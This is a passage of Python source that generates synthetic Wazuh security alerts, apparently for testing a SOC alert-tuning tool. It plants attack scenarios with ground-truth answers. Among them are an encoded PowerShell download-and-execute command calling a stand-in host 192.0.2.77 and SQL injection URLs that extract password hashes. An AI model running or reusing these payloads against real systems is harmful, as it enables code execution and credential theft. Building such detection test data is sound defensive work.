                    self.plan.append((ms, ("ssh", web, _SCANNER_USERS[i % len(_SCANNER_USERS)])))
                    ms += self.rng.randrange(20_000, 45_000)
                ms += self.rng.randrange(60_000, 120_000)
                for i in range(self.rng.randint(8, 14)):
                    self.plan.append((ms, ("url", web, _SCANNER_URLS[i % len(_SCANNER_URLS)])))
                    ms += self.rng.randrange(15_000, 40_000)
                ms += self.rng.randrange(120_000, 300_000)

    def make(self, ms: int, item: Any) -> None:
        what, web, value = item
        if what == "ssh":
            self.push(ms, "5710", web, _sshd_invalid(web, ms, self.rng, value, SCANNER_IP), ("b",))
            return
        url = value + "A" * self.rng.randrange(2100, 2400)  # longer than any browser sends (2083)
        body = _web(web, ms, SCANNER_IP, "GET", url, 414, 173, "Mozilla/5.0 (compatible; VulnScanner/9.4; +scan)")
        self.push(ms, "31115", web, body, ("u",))


class _BruteForce(_Planned):
    """Scenario d: bursts of invalid-user attempts from a NEW external IP against srv-web-02 (last 2 days)."""

    def __init__(self, world: _World) -> None:
        super().__init__(world, "planted:bruteforce")
        self.agent = world.by_name["srv-web-02"]
        span = (world.now_ms - 90 * 60_000 - world.brute_start_ms) // 5
        for slot in range(5):
            ms = world.brute_start_ms + slot * span + self.rng.randrange(span // 2)
            end = ms + self.rng.randrange(10, 26) * 60_000
            while ms < end:
                self.plan.append((ms, self.rng.choice(_INVALID_USERS)))
                ms += self.rng.randrange(2_000, 6_000)

    def make(self, ms: int, item: Any) -> None:
        self.push(ms, "5710", self.agent, _sshd_invalid(self.agent, ms, self.rng, item, BRUTE_FORCE_IP), ("d",))


class _Spray(_Planned):
    """Scenario e: low-and-slow password spray on dc01, one attempt per account per round (last 3 days).

    Attempts are >= 35 s apart, so 60204 (8 failures in 240 s from one address) never fires: only volume and
    breadth give it away.
    """

    def __init__(self, world: _World) -> None:
        super().__init__(world, "planted:spray")
        self.agent = world.by_name["dc01"]
        self.people = {str(a.owner) for a in world.fleet if a.role == "laptop"} | set(_ADMINS)
        users = sorted(self.people) + list(_SPRAY_EXTRA)
        start = world.spray_start_ms
        while start < world.now_ms - 20 * 60_000:
            order = users[:]
            self.rng.shuffle(order)
            ms = start
            for user in order:
                self.plan.append((ms, user))
                ms += self.rng.randrange(35_000, 80_000)
            start += 2 * _HOUR_MS + self.rng.randrange(-600_000, 600_000)

    def make(self, ms: int, item: Any) -> None:
        body = _logon_failed(self.agent, ms, self.rng, user=item, ip=SPRAY_IP, exists=item in self.people)
        self.push(ms, "60122", self.agent, body, ("e",))


class _Beacon(_Planned):
    """Scenario f: lap-007 calls 192.0.2.77:443 every 5 minutes (+-4 s) whenever it is on, last 6 days."""

    def __init__(self, world: _World) -> None:
        super().__init__(world, "planted:beacon")
        self.agent = world.by_name["lap-007"]
        self.owner = str(self.agent.owner)
        self.image = rf"C:\Users\{self.owner}\AppData\Local\Temp\msupdate\updater.exe"
        for on, off in sorted(world.schedules.get(self.agent.name, {}).values()):
            if off <= world.beacon_start_ms:
                continue
            ms = max(on, world.beacon_start_ms) + self.rng.randrange(40_000, 200_000)
            while ms < off:
                self.plan.append((ms, None))
                ms += 300_000 + self.rng.randrange(-4_000, 4_001)

    def make(self, ms: int, item: Any) -> None:
        body = _net_connection(self.agent, ms, self.rng, f"{_DOMAIN}\\{self.owner}", self.image, BEACON_IP, 443)
        self.push(ms, "92150", self.agent, body, ("f",))


class _SlowBurn(_Planned):
    """Scenario g: 10.30.0.99 probes srv-web-03 every 4-8 minutes all window; two SQL injections succeed."""

    def __init__(self, world: _World) -> None:
        super().__init__(world, "planted:slowburn")
        self.agent = world.by_name["srv-web-03"]
        ms = world.start_ms + self.rng.randrange(300_000)
        while ms < world.now_ms:
            self.plan.append((ms, "probe"))
            ms += self.rng.randrange(240_000, 480_000)
        for days_ago, hour, minute in ((8, 13, 12), (2, 3, 47)):
            day = (world.now - timedelta(days=days_ago)).astimezone(world.tz).date()
            ms = self.local_ms(day, hour, minute)
            for _ in range(3):
                self.plan.append((ms, "sqli"))
                ms += self.rng.randrange(40_000, 120_000)
            self.plan.append((ms, "success"))
        self.plan.sort(key=lambda item: item[0])

    def make(self, ms: int, item: Any) -> None:
        rng = self.rng
        agent_str = "python-requests/2.31.0"
        if item == "probe":
            url = rng.choice(_PROBE_PATHS) + str(rng.randrange(1, 99999))
            status = rng.choice((400, 400, 400, 404, 403))
            self.push(
                ms,
                "31101",
                self.agent,
                _web(self.agent, ms, SLOW_BURN_IP, "GET", url, status, rng.randrange(120, 400), agent_str),
                ("g",),
            )
        elif item == "sqli":
            url = f"/api/v2/items?id={rng.randrange(1, 999)}%20union%20select%20null,null,version()--"
            self.push(
                ms, "31103", self.agent, _web(self.agent, ms, SLOW_BURN_IP, "GET", url, 500, 321, agent_str), ("g",)
            )
        else:
            url = "/api/v2/items?id=1%20union%20select%20username,password_hash%20from%20users--"
            self.push(
                ms, "31106", self.agent, _web(self.agent, ms, SLOW_BURN_IP, "GET", url, 200, 48213, agent_str), ("g",)
            )


_MACRO = _Launch(
    image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
    # base64 (UTF-16LE) of: IEX (iwr http://192.0.2.77/p.ps1)
    command="powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwAxADkAMgAuADAALgAyAC4ANwA3AC8"
    "AcAAuAHAAcwAxACkA",
    parent=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
    parent_command=r'"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n '
    r'"C:\Users\{u}\Downloads\invoice.docm"',
)


class _Macro(_Planned):
    """Scenario s: a Word macro starts encoded PowerShell on lap-003 (yesterday), hidden inside two noisy rules:
    92001 (scripting interpreter started, where scheduled PowerShell is common) and 67027 (process creation)."""

    def __init__(self, world: _World) -> None:
        super().__init__(world, "planted:macro")
        self.agent = world.by_name["lap-003"]
        spans = [s for s in world.schedules.get(self.agent.name, {}).values() if s[1] <= world.now_ms - _HOUR_MS]
        if spans:
            on, off = max(spans)
            ms = min(on + 2 * _HOUR_MS + self.rng.randrange(1_800_000), off - 600_000)
            self.plan.extend(((ms, "4688"), (ms + self.rng.randrange(300, 900), "sysmon")))

    def make(self, ms: int, item: Any) -> None:
        owner = str(self.agent.owner)
        launch = _MACRO._replace(parent_command=_MACRO.parent_command.replace("{u}", owner))
        if item == "4688":
            body = _process_created(self.agent, ms, self.rng, owner, launch)
            self.push(ms, "67027", self.agent, body, ("s",))
        else:
            body = _script_started(self.agent, ms, self.rng, f"{_DOMAIN}\\{owner}", False, launch)
            self.push(ms, "92001", self.agent, body, ("s",))


class _Tamper(_Planned):
    """Scenario i: the Security log of dc02 is cleared (1102) ~20 minutes before dc02 goes silent."""

    def __init__(self, world: _World) -> None:
        super().__init__(world, "planted:tamper")
        self.agent = world.by_name["dc02"]
        self.plan.append((world.clear_log_ms + self.rng.randrange(30_000), None))

    def make(self, ms: int, item: Any) -> None:
        self.push(ms, "63103", self.agent, _log_cleared(self.agent, ms, self.rng, "carol.adm"), ("i",))


def _streams(world: _World) -> list[_Stream]:
    streams: list[_Stream] = []
    for agent in world.fleet:
        role = agent.role
        if role in ("manager", "web", "db"):
            streams.append(_LinuxHost(world, agent))
        elif role == "legacy":
            streams.append(_LinuxHost(world, agent, stop_ms=world.legacy_stop_ms))
        elif role == "dc":
            stop = world.dc02_silence_ms if agent.name == "dc02" else None
            streams.append(_WindowsHost(world, agent, logons=5.0, sysmon=1.0, lsass=1.0, stop_ms=stop))
        elif role == "backup":
            streams.append(_WindowsHost(world, agent, logons=0.5, sysmon=2.0, sysmon_stop_ms=world.sysmon_stop_ms))
        elif agent.name == "srv-app-01":  # scenario n: Security but never Sysmon
            streams.append(_WindowsHost(world, agent, logons=0.8))
        elif agent.name == "srv-app-02":  # scenario o: 4624 but never 4688
            streams.append(_WindowsHost(world, agent, logons=0.8, processes=False, sysmon=1.0, lsass=0.8))
        elif role == "app":
            streams.append(_WindowsHost(world, agent, logons=0.8, sysmon=1.0, lsass=0.8))
        elif role == "laptop":
            streams.append(_Laptop(world, agent))
        if role == "db":
            streams.append(_FimNoise(world, agent))
    streams.extend(
        (
            _Firewall(world),
            _BackupJob(world),
            _Scanner(world),
            _BruteForce(world),
            _Spray(world),
            _Beacon(world),
            _SlowBurn(world),
            _Tamper(world),
            _Macro(world),
        )
    )
    for index, stream in enumerate(streams):
        stream.index = index
    return streams


# ---- correlation (frequency rules) and the alert writer --------------------------------------------------------


class _Correlation(NamedTuple):
    child: str
    parents: frozenset[str]
    field: str  # same_srcip -> data.srcip ; same_field -> data.<name>
    frequency: int
    timeframe_ms: int
    ignore_ms: int


def _correlations(rules: Sequence[_Rule]) -> list[_Correlation]:
    """The frequency rules, evaluated like analysisd: the Nth matching parent event within the timeframe (same
    agent, same field value) is reported as the child rule; ``ignore`` is a per-rule quiet period during which
    matching events stay reported as the parent."""
    by_group: dict[str, set[str]] = {}
    for rule in rules:
        if rule.level > 0 and rule.file != _LOCAL_RULES:
            for name in (rule.parent_groups + rule.groups).split(","):
                if name:
                    by_group.setdefault(name, set()).add(rule.id)
    out: list[_Correlation] = []
    for rule in rules:
        frequency = rule.attr_int("frequency", 0)
        if not frequency:
            continue
        parents: set[str] = set()
        key = "data.srcip"
        for tag, _attrs, text in rule.body:
            if tag == "if_matched_sid":
                parents.update(text.replace(",", " ").split())
            elif tag == "if_matched_group":
                parents.update(by_group.get(text, set()))
            elif tag == "same_field":
                key = f"data.{text}"
        timeframe = rule.attr_int("timeframe", 360) * 1000
        out.append(
            _Correlation(rule.id, frozenset(parents), key, frequency, timeframe, rule.attr_int("ignore", 0) * 1000)
        )
    return out


class _Correlator:
    def __init__(self, correlations: Sequence[_Correlation]) -> None:
        self.by_parent: dict[str, list[_Correlation]] = {}
        for corr in correlations:
            for parent in sorted(corr.parents):
                self.by_parent.setdefault(parent, []).append(corr)
        self.windows: dict[tuple[str, str, str], deque[tuple[int, str | None]]] = {}
        self.ignore_until: dict[str, int] = {}
        self._seen = 0

    def process(self, ms: int, rule_id: str, agent: _Agent, body: dict[str, Any]) -> tuple[str, list[str] | None]:
        specs = self.by_parent.get(rule_id)
        if not specs:
            return rule_id, None
        self._seen += 1
        if self._seen % 50_000 == 0:
            self._prune(ms)
        fired: tuple[str, list[str]] | None = None
        for corr in specs:
            value = _get(body, corr.field)
            if value in (None, "", "-"):
                continue
            window = self.windows.setdefault((corr.child, agent.id, str(value)), deque())
            window.append((ms, body.get("full_log")))
            while window and ms - window[0][0] > corr.timeframe_ms:
                window.popleft()
            if fired is None and len(window) >= corr.frequency and ms >= self.ignore_until.get(corr.child, 0):
                # like analysisd, report the frequency - 1 matched events that precede this one
                previous = [line for _, line in list(window)[-corr.frequency : -1] if line]
                window.clear()
                self.ignore_until[corr.child] = ms + corr.ignore_ms
                fired = (corr.child, previous)
        return fired if fired is not None else (rule_id, None)

    def _prune(self, ms: int) -> None:
        horizon = 3_600_000
        for key in [k for k, w in self.windows.items() if not w or ms - w[-1][0] > horizon]:
            del self.windows[key]


def _get(doc: Mapping[str, Any], path: str) -> Any:
    current: Any = doc
    for part in path.split("."):
        if not isinstance(current, Mapping):
            return None
        current = current.get(part)
    return current


class _TagStat:
    __slots__ = ("count", "first", "last", "rules")

    def __init__(self) -> None:
        self.count = 0
        self.first = 0
        self.last = 0
        self.rules: dict[str, int] = {}


class _Stats:
    """Facts about what was actually written (the ground truth is built from these, not from intentions)."""

    def __init__(self) -> None:
        self.total = 0
        self.rules: dict[str, int] = {}
        self.tags: dict[str, _TagStat] = {}
        self.sources: dict[tuple[str, str], list[int]] = {}  # (host, log source) -> [count, first, last]
        self.hosts: dict[str, list[int]] = {}
        self.codes: dict[tuple[str, str], set[str]] = {}  # (host, channel) -> Windows event IDs
        self.fw_fields = [0, 0, 0, 0]  # before: events, with dstport; after: events, with dstport
        self.pool: dict[str, list[tuple[int, str, str]]] = {"a": [], "b": [], "e": [], "u": []}
        self.laptop_off_hours = 0
        self.spray_users: set[str] = set()
        self.high_alerts: dict[str, list[int]] = {}  # rule id (level >= 10) -> timestamps (small: capped)

    def tag(self, name: str) -> _TagStat:
        return self.tags.get(name) or _TagStat()


def _write_alerts(path: Path, world: _World, registry: Sequence[_Rule]) -> _Stats:
    """Merge every stream in timestamp order, apply the frequency rules and write Wazuh alerts.json lines."""
    stats = _Stats()
    rules = _alert_rules(registry)
    correlator = _Correlator(_correlations(registry))
    streams = _streams(world)
    fired: dict[str, int] = {}
    records: dict[tuple[str, str], int] = {}
    agent_objs = {a.id: a.alert_obj() for a in world.fleet}
    manager_obj = {"name": MANAGER_NAME}
    encode = json.JSONEncoder(ensure_ascii=False, separators=(",", ":"), check_circular=False).encode
    tmp = path.with_name(path.name + ".partial")
    offset = 0
    last_ms = -1
    try:
        with tmp.open("wb", buffering=1 << 20) as handle:
            for ms, _index, _seq, rule_id, agent, body, tags, description in heapq.merge(
                *(s.events() for s in streams)
            ):
                if ms < last_ms:  # defensive: the file must be sorted by timestamp
                    raise RuntimeError("demo generator produced events out of order")
                last_ms = ms
                final_id, previous = correlator.process(ms, rule_id, agent, body)
                if final_id != rule_id:
                    description = None
                spec = rules[final_id]
                count = fired.get(final_id, 0) + 1
                fired[final_id] = count
                rule_obj = dict(spec.head)
                if description is not None:
                    rule_obj["description"] = description
                rule_obj["firedtimes"] = count
                rule_obj.update(spec.tail)
                doc: dict[str, Any] = {
                    "timestamp": _wazuh_ts(ms),
                    "rule": rule_obj,
                    "agent": agent_objs[agent.id],
                    "manager": manager_obj,
                    "id": f"{ms // 1000}.{offset}",
                }
                if previous:
                    doc["previous_output"] = "\n".join(previous)
                system = _get(body, "data.win.system")
                if isinstance(system, dict):
                    key = (agent.id, str(system["channel"]))
                    record = records.get(key)
                    if record is None:
                        record = 150_000 + int(agent.id) * 7_919 + len(key[1]) * 131
                    records[key] = record + 1
                    system["eventRecordID"] = str(record + 1)
                doc.update(body)
                line = (encode(doc) + "\n").encode("utf-8")
                handle.write(line)
                _account(stats, world, ms, final_id, spec.level, agent, body, tags, doc["id"])
                offset += len(line)
    except BaseException:
        tmp.unlink(missing_ok=True)
        raise
    tmp.replace(path)
    return stats


def _account(
    stats: _Stats,
    world: _World,
    ms: int,
    rule_id: str,
    level: int,
    agent: _Agent,
    body: Mapping[str, Any],
    tags: tuple[str, ...],
    alert_id: str,
) -> None:
    stats.total += 1
    stats.rules[rule_id] = stats.rules.get(rule_id, 0) + 1
    host = agent.name
    hostname = _get(body, "predecoder.hostname")
    if agent.id == "000" and hostname:
        host = str(hostname)
    channel = _get(body, "data.win.system.channel")
    source = str(channel) if channel else str(body.get("location", ""))
    for entry in (stats.sources.setdefault((host, source), [0, ms, ms]), stats.hosts.setdefault(host, [0, ms, ms])):
        entry[0] += 1
        entry[2] = ms
    if channel:
        stats.codes.setdefault((host, str(channel)), set()).add(str(_get(body, "data.win.system.eventID")))
    for tag in tags:
        tag_stat = stats.tags.get(tag)
        if tag_stat is None:
            tag_stat = stats.tags[tag] = _TagStat()
            tag_stat.first = ms
        tag_stat.count += 1
        tag_stat.last = ms
        tag_stat.rules[rule_id] = tag_stat.rules.get(rule_id, 0) + 1
        if tag in stats.pool:
            stats.pool[tag].append((ms, alert_id, rule_id))
        if tag == "e":
            stats.spray_users.add(str(_get(body, "data.win.eventdata.targetUserName")))
    if host == "fw-edge-01":
        after = 2 if ms >= world.fw_upgrade_ms else 0
        stats.fw_fields[after] += 1
        if _get(body, "data.dstport") is not None:
            stats.fw_fields[after + 1] += 1
    if agent.role == "laptop":
        span = world.schedules.get(agent.name, {}).get(world.info_at(ms).local_date)
        if span is None or not span[0] <= ms < span[1]:
            stats.laptop_off_hours += 1
    if level >= 10:
        times = stats.high_alerts.setdefault(rule_id, [])
        if len(times) < 500:
            times.append(ms)


# ---- the other files -------------------------------------------------------------------------------------------


def _api_ts(ms: int) -> str:
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(ms // 1000))


def _write_agents(path: Path, world: _World) -> None:
    """A Wazuh API ``GET /agents`` response (items under ``data.affected_items``)."""
    rng = _stream_rng(world.seed, "api-agents")
    items: list[dict[str, Any]] = []
    for index, agent in enumerate(world.fleet):
        keepalive: str | None = _api_ts(world.now_ms - rng.randrange(5_000, 55_000))
        status = "active"
        if agent.role == "manager":
            keepalive = "9999-12-31T23:59:59Z"
        elif agent.role == "new":
            status, keepalive = "never_connected", None
        elif agent.role == "legacy":
            status, keepalive = "disconnected", _api_ts(world.legacy_stop_ms + 95_000)
        elif agent.role == "laptop":
            spans = [s for s in world.schedules.get(agent.name, {}).values() if s[0] <= world.now_ms]
            current = max(spans) if spans else None
            if current is None:
                status, keepalive = "disconnected", _api_ts(world.start_ms)
            elif current[1] <= world.now_ms:  # powered off: disconnected once agents_disconnection_time (15m) passes
                last = min(current[1] + rng.randrange(0, 60_000), world.now_ms - 1_000)
                status = "disconnected" if world.now_ms - current[1] > 15 * 60_000 else "active"
                keepalive = _api_ts(last)
        item: dict[str, Any] = {}
        if agent.role != "new":
            item["os"] = _api_os(agent)
        if keepalive is not None:
            item["lastKeepAlive"] = keepalive
        item["id"] = agent.id
        added = world.now_ms - 3 * _DAY_MS if agent.role == "new" else world.start_ms - (400 - 7 * index) * _DAY_MS
        item["dateAdd"] = _api_ts(added + rng.randrange(0, 3_600_000))
        if agent.role != "manager":
            item["manager"] = MANAGER_NAME
            item["group"] = list(agent.groups)
        item["registerIP"] = "any" if agent.role != "manager" else "127.0.0.1"
        item["ip"] = agent.ip or ("127.0.0.1" if agent.role == "manager" else "any")
        item["name"] = agent.name
        item["status"] = status
        if agent.role != "new":
            item["version"] = agent.version
        item["node_name"] = "node01"
        if agent.role not in ("manager", "new"):
            item["group_config_status"] = "synced"
        items.append(item)
    response = {
        "data": {
            "affected_items": items,
            "total_affected_items": len(items),
            "total_failed_items": 0,
            "failed_items": [],
        },
        "message": "All selected agents information was returned",
        "error": 0,
    }
    path.write_text(json.dumps(response, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")


def _api_os(agent: _Agent) -> dict[str, str]:
    if agent.windows:
        build = agent.os_version.split(".")[2]
        return {
            "build": build,
            "major": "10",
            "minor": "0",
            "name": agent.os_name,
            "platform": "windows",
            "uname": agent.os_name,
            "version": agent.os_version,
        }
    major, minor = [*agent.os_version.split(" ")[0].split("."), "0"][:2]
    if agent.platform == "rhel":
        kernel = "5.14.0-427.13.1.el9_4.x86_64"
    else:
        kernel = "5.4.0-196-generic" if agent.os_version.startswith("20.") else "6.8.0-45-generic"
    return {
        "arch": "x86_64",
        "major": major,
        "minor": minor,
        "name": agent.os_name,
        "platform": agent.platform,
        "uname": f"Linux |{agent.name} |{kernel} |#1 SMP |x86_64",
        "version": agent.os_version,
    }


_DISPOSITION_COLUMNS = ("alert_id", "rule_id", "field", "value", "verdict", "closed_at", "analyst", "comment")


def _write_dispositions(path: Path, world: _World, stats: _Stats) -> dict[str, dict[str, int]]:
    """Analyst verdicts: FP/BTP on the benign candidates (a, b, u), a TP scope on the spray (e), a few untriaged."""
    rows: list[tuple[int, list[str]]] = []
    summary: dict[str, dict[str, int]] = {}
    plans = (
        ("a", ("btp", "btp", "fp"), "Nightly backup job of svc_backup (CHG-0101)"),
        ("b", ("fp", "btp"), "Authorized nightly vulnerability scan from the internal scanner"),
        ("u", ("btp", "fp"), "Authorized nightly vulnerability scan (over-long URL checks, CHG-0107)"),
    )
    for tag, verdicts, comment in plans:
        # analysts close alerts some time after they fire: only alerts older than two hours are dispositioned
        pool = [item for item in stats.pool[tag] if item[0] <= world.now_ms - 2 * _HOUR_MS]
        indexes = sorted({i * len(pool) // 24 for i in range(24)}) if pool else []
        counts = summary.setdefault(tag, {})
        for i, index in enumerate(indexes):
            ms, alert_id, rule_id = pool[index]
            verdict = verdicts[i % len(verdicts)]
            closed = min(ms + (47 + (i * 37) % 180) * 60_000, world.now_ms - 60_000)
            rows.append(
                (closed, [alert_id, rule_id, "", "", verdict, _api_ts(closed), f"soc-analyst-{1 + i % 3}", comment])
            )
            counts[verdict] = counts.get(verdict, 0) + 1
        untriaged = [i for i in range(3, len(pool), max(1, len(pool) // 3)) if i not in indexes][:2]
        for index in untriaged:  # auto-closed: never counts as FP evidence
            ms, alert_id, rule_id = pool[index]
            closed = min(ms + 3 * _HOUR_MS, world.now_ms - 60_000)
            rows.append((closed, [alert_id, rule_id, "", "", "untriaged", _api_ts(closed), "auto-close", ""]))
            counts["untriaged"] = counts.get("untriaged", 0) + 1
    spray = stats.pool["e"]
    if spray:
        ms, alert_id, rule_id = spray[0]
        closed = min(ms + 5 * _HOUR_MS, world.now_ms - 60_000)
        rows.append(
            (
                closed,
                [
                    alert_id,
                    rule_id,
                    "",
                    "",
                    "tp",
                    _api_ts(closed),
                    "soc-analyst-2",
                    "Password spray confirmed (INC-2291)",
                ],
            )
        )
        rows.append(
            (
                closed + 60_000,
                [
                    "",
                    "60122",
                    "data.win.eventdata.ipAddress",
                    SPRAY_IP,
                    "tp",
                    _api_ts(closed + 60_000),
                    "soc-lead",
                    "Source blocked at the edge (INC-2291)",
                ],
            )
        )
        summary["e"] = {"tp": 2}
    rows.sort(key=lambda row: (row[0], row[1][0], row[1][2]))
    buffer = io.StringIO()
    writer = csv.writer(buffer, lineterminator="\n")
    writer.writerow(_DISPOSITION_COLUMNS)
    for _closed, row in rows:
        writer.writerow(row)
    path.write_text(buffer.getvalue(), encoding="utf-8")
    return summary


def _config_text(world: _World) -> str:
    holiday = world.holiday.isoformat()
    return f"""# hushwatch demo tenant, written by `hushwatch demo` (synthetic data only; safe to share).
# Relative file paths are resolved against the directory of this file.
tenants:
  {TENANT_NAME}:
    timezone: {TIMEZONE}
    triage_level: 5
    high_level: 10
    max_tunable_level: 9
    internal_networks: [10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16]
    trusted_entities:
      user: [svc_backup]
      data.srcip: ["{SCANNER_IP}"]   # internal vulnerability scanner
    criticality:
      critical: ["dc*", "fw-*"]
      low: ["lap-*"]
    sla: {{critical: 4h, standard: 24h, low: 72h}}
    expectations:
      - name: windows servers
        match: {{platform: windows, name: "srv-*"}}
        log_sources: [Security, "{_SYSMON_CHANNEL}"]
      - name: domain controllers
        match: {{platform: windows, name: "dc*"}}
        log_sources: [Security, "{_SYSMON_CHANNEL}"]
    calendar:
      - {{start: {holiday}, end: {holiday}, reason: public holiday}}
    inputs:
      - type: file
        path: {ALERTS_FILE}
        profile: wazuh4
    ruleset_dirs: [{RULES_DIR}]
    dispositions: {DISPOSITIONS_FILE}
    noise:
      minutes_per_alert: [1, 5]
    silence:
      baseline: 14d
      alarm_budget: 0.05
"""


# ---- ground truth ------------------------------------------------------------------------------------------------

_NOISE_BLOCKED = ("investigate", "fix_at_source", "do_not_tune", "aggregate")
_NOISE_BLOCKED_KINDS = tuple(f"noise.{v}" for v in _NOISE_BLOCKED)
_SILENCE_KINDS = (
    "silence.silent",
    "silence.drop",
    "silence.decay",
    "silence.rule_dark",
    "silence.field_lost",
    "silence.tampering",
)
_TUNING_DEBT = (
    # id, key, title, local rule, expected kinds, parent rule, reasons
    (
        "t1",
        "tuning.whole_rule_mute",
        "Local rule 100010 mutes every sshd authentication failure and breaks rule 5720",
        "100010",
        ("tuning.risky_suppression",),
        "5716",
        (
            "level-0 child with only if_sid (whole-rule mute)",
            "parent 5716 feeds the frequency rule 5720",
            "parent carries a sensitive MITRE tactic (Credential Access)",
        ),
    ),
    (
        "t2",
        "tuning.unanchored_user",
        "Local rule 100011 mutes sshd invalid users containing 'test' (substring match) and breaks 5712",
        "100011",
        ("tuning.risky_suppression",),
        "5710",
        (
            "unanchored <user> (osmatch substring: also matches 'tester', 'contest')",
            "only condition is an attacker-controlled field (user name of a failed logon)",
            "parent 5710 feeds 5712 (if_matched_sid) and 60204 (if_matched_group)",
        ),
    ),
    (
        "t3",
        "tuning.attacker_field",
        "Local rule 100020 mutes Windows logon failures by a substring of the attacker-supplied user name",
        "100020",
        ("tuning.risky_suppression",),
        "60122",
        (
            "unanchored <field> on win.eventdata.targetUserName",
            "attacker-controlled field of a failed logon",
            "parent 60122 feeds 60204 (if_matched_group authentication_failed)",
        ),
    ),
    (
        "t4",
        "tuning.expired",
        "Local rule 100030 is past its expiry date",
        "100030",
        ("tuning.expired",),
        "60106",
        ("the expiry date in the description is in the past",),
    ),
    (
        "t5",
        "tuning.safe_control",
        "Local rule 100040 is a well-scoped, current demotion (no finding expected)",
        "100040",
        (),
        "60106",
        ("level-3 demotion, anchored pcre2 on agent and user, parent groups kept, future expiry",),
    ),
)


class _Truth:
    """Read-only helpers over the write statistics used to fill in the ground truth."""

    def __init__(self, world: _World, stats: _Stats) -> None:
        self.w = world
        self.s = stats

    def span(self, tag: str) -> dict[str, Any]:
        item = self.s.tags.get(tag)
        if item is None:
            return {"start": None, "end": None, "count": 0, "counts": ()}
        counts = tuple(sorted(item.rules.items(), key=lambda kv: int(kv[0])))
        return {"start": _dt(item.first), "end": _dt(item.last), "count": item.count, "counts": counts}

    def share(self, tag: str, rule_id: str) -> float:
        total = self.s.rules.get(rule_id, 0)
        return round(self.s.tag(tag).rules.get(rule_id, 0) / total, 4) if total else 0.0

    def source(self, host: str, name: str) -> list[int]:
        return self.s.sources.get((host, name), [0, 0, 0])

    def host(self, name: str) -> list[int]:
        return self.s.hosts.get(name, [0, 0, 0])

    def names(self, *roles: str) -> list[str]:
        return [a.name for a in self.w.fleet if a.role in roles]


def _ground_truth(world: _World, stats: _Stats, dispositions: Mapping[str, Mapping[str, int]]) -> list[PlantedScenario]:
    t = _Truth(world, stats)
    windows_hosts = [a.name for a in world.fleet if a.windows and a.role not in ("new", "mon")]
    window_days = (world.now_ms - world.start_ms) / _DAY_MS
    brute = t.span("d")
    brute_first = _ms(brute["start"]) if brute["start"] else world.now_ms
    beacon_owner = world.by_name["lap-007"].owner
    dc02, sysmon, legacy = t.host("dc02"), t.source("srv-backup-01", _SYSMON_CHANNEL), t.host("srv-legacy-01")
    fw_before, fw_before_with, fw_after, fw_after_with = stats.fw_fields
    out = [
        PlantedScenario(
            id="a",
            key="noise.svc_backup_logons",
            category="noise_safe",
            title="Nightly svc_backup logons on srv-backup-01: benign scheduled automation",
            # rule 60106 is level 3: below the triage level and already at the demote level, so no analyst would
            # see less by tuning it; it is reported as index volume (verdict "watch"), never as a tuning candidate
            expected_kinds=("noise.index_volume",),
            expected_verdict="watch",
            allowed_verdicts=("watch", "tune"),
            review_required=False,
            rule_ids=("60106",),
            conditions=(("agent.name", "srv-backup-01"), ("data.win.eventdata.targetUserName", "svc_backup")),
            agent="srv-backup-01",
            log_source="Security",
            entities=(("user", "user", "svc_backup"), ("host", "host", "srv-backup-01")),
            details={
                "schedule": "every night 00:30-04:30 local time (logon type 4, batch)",
                "share_of_rule": t.share("a", "60106"),
                "trusted_entity": "user: svc_backup",
                "dispositions": dict(dispositions.get("a", {})),
                "high_level_alerts_on_host": 0,
                "rule_level": 3,
                "impact": "index volume only (below the triage level, already at the demote level)",
            },
            **t.span("a"),
        ),
        PlantedScenario(
            id="b",
            key="noise.internal_scanner",
            category="noise_safe",
            title="Internal vulnerability scanner 10.20.0.15 triggering sshd invalid-user alerts on the web servers",
            expected_kinds=("noise.tune",),
            expected_verdict="tune",
            allowed_verdicts=("tune",),
            review_required=True,
            rule_ids=("5710",),
            conditions=(("data.srcip", SCANNER_IP),),
            log_source="/var/log/auth.log",
            entities=(("ip", "ip", SCANNER_IP),),
            details={
                "agents": t.names("web"),
                "schedule": "every night from 02:00 local time, >= 20 s between attempts (5712 never fires)",
                "share_of_rule": t.share("b", "5710"),
                "dependents": ["5712", "60204"],
                "sensitive_tactic": "Credential Access",
                "trusted_entity": f"data.srcip: {SCANNER_IP}",
                "dispositions": dict(dispositions.get("b", {})),
            },
            **t.span("b"),
        ),
        PlantedScenario(
            id="u",
            key="noise.scanner_long_urls",
            category="noise_safe",
            title="Internal vulnerability scanner 10.20.0.15 sending over-long URLs to the web servers every night",
            expected_kinds=("noise.tune",),
            expected_verdict="tune",
            allowed_verdicts=("tune",),
            review_required=False,
            rule_ids=("31115",),
            conditions=(("data.srcip", SCANNER_IP),),
            log_source="/var/log/nginx/access.log",
            entities=(("ip", "ip", SCANNER_IP),),
            details={
                "agents": t.names("web"),
                "schedule": "every night from 02:00 local time, right after the ssh checks; the servers answer 414",
                "share_of_rule": t.share("u", "31115"),
                "rule_level": 7,
                "dependents": [],
                "trusted_entity": f"data.srcip: {SCANNER_IP}",
                "dispositions": dict(dispositions.get("u", {})),
            },
            **t.span("u"),
        ),
        PlantedScenario(
            id="c",
            key="noise.fim_app_logs",
            category="noise_safe",
            title="File integrity monitoring of constantly changing application logs (/var/log/app/*.log) on the "
            "database servers",
            expected_kinds=("noise.fix_at_source",),
            expected_verdict="fix_at_source",
            allowed_verdicts=("fix_at_source",),
            rule_ids=("550",),
            log_source="syscheck",
            entities=(("path", "file", "/var/log/app/*.log"),),
            details={
                "agents": t.names("db"),
                "paths": list(_APP_LOGS),
                "match": "rule 550 and syscheck.path in paths and agent.name in agents",
                "share_of_rule": t.share("c", "550"),
                "recommendation": "ignore the path in the agents' syscheck configuration",
            },
            **t.span("c"),
        ),
        PlantedScenario(
            id="d",
            key="trap.ssh_brute_force",
            category="noise_trap",
            title="SSH brute force from the new external address 203.0.113.50 against srv-web-02",
            expected_kinds=_NOISE_BLOCKED_KINDS,
            forbidden_kinds=("noise.tune",),
            allowed_verdicts=_NOISE_BLOCKED,
            rule_ids=("5710", "5712"),
            conditions=(("data.srcip", BRUTE_FORCE_IP),),
            agent="srv-web-02",
            log_source="/var/log/auth.log",
            must_not_hide=True,
